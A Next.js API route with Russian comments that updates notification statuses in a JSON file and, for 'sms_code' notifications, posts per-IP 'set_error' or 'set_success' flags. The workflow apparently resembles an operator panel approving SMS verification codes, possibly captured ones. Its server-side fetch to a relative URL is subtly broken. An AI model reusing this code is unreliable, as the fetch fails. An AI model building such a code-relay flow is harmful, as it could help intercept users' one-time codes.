import { NextRequest, NextResponse } from 'next/server';
import fs from 'fs';
import path from 'path';

const NOTIFICATIONS_FILE = path.join(process.cwd(), 'notifications.json');

// Чтение уведомлений из файла
function readNotifications() {
  try {
    const data = fs.readFileSync(NOTIFICATIONS_FILE, 'utf-8');
    return JSON.parse(data);
  } catch (error) {
    console.error('Error reading notifications:', error);
    return [];
  }
}

// Запись уведомлений в файл
function writeNotifications(notifications: any[]) {
  try {
    fs.writeFileSync(NOTIFICATIONS_FILE, JSON.stringify(notifications, null, 2));
  } catch (error) {
    console.error('Error writing notifications:', error);
  }
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const { notificationId, action } = body;

    if (!notificationId || !action) {
      return NextResponse.json({ ok: false, error: 'Missing required fields' }, { status: 400 });
    }

    const notifications = readNotifications();
    const notificationIndex = notifications.findIndex(n => n.id === notificationId);

    if (notificationIndex === -1) {
      return NextResponse.json({ ok: false, error: 'Notification not found' }, { status: 404 });
    }

    // Обновляем статус уведомления
    notifications[notificationIndex].status = action;
    writeNotifications(notifications);

    // Если это действие с кодом, отправляем соответствующий флаг
    if (notifications[notificationIndex].type === 'sms_code') {
      const ip = notifications[notificationIndex].data.ip;
      if (ip) {
        if (action === 'error') {
          // Отправляем флаг ошибки
          await fetch('/api/notify', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              action: 'set_error',
              ip
            })
          });
        } else if (action === 'success') {
          // Отправляем флаг успеха
          await fetch('/api/notify', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              action: 'set_success',
              ip
            })
          });
        }
      }
    }

    return NextResponse.json({ ok: true });
  } catch (error) {
    console.error('Error handling action:', error);
    return NextResponse.json({ ok: false, error: 'Internal server error' }, { status: 500 });
  }
} 